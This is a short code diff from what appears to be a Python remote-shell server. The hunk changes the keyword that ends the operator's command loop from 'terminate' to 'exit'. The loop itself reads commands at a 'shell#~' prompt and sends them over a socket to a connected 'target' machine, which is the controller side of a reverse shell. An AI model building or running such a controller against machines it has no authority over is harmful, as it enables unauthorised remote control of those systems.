@@ -51,7 +51,7 @@ class Server:
                 command = input(f'shell#~{self.addr[0]}@{self.addr[1]}: ')
                 if command == '':
                     command = "\n"
-                elif command == 'terminate':
+                elif command == 'exit':
                     break
                 target.sendall(command.encode('utf-8'))
 
